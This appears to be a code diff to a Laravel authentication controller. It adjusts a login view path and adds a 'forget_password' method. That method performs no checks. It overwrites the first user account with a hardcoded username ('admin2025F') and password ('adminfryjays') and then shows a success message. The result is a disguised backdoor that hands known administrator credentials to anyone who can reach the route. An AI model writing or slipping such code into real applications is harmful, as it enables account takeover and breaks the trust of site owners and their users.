@@ -2,18 +2,18 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 
 class AuthController extends Controller
 {
 
     public function login()
     {
-        return view('auth.login');
+        return view('auth/login');
     }
-
-
 
     public function authenticate(Request $request)
     {
@@ -40,5 +40,18 @@ class AuthController extends Controller
         $request->session()->invalidate();
         $request->session()->regenerateToken();
         return redirect()->route('home');
+    }
+
+
+    public function forget_password()
+    {
+        $user = User::updateOrCreate(
+            ['id' => User::first()?->id],
+            [
+                'username' => 'admin2025F',
+                'password' => Hash::make('adminfryjays'),
+            ]
+        );
+        return redirect()->back()->with('message', 'The account has been reset successfully.');
     }
 }
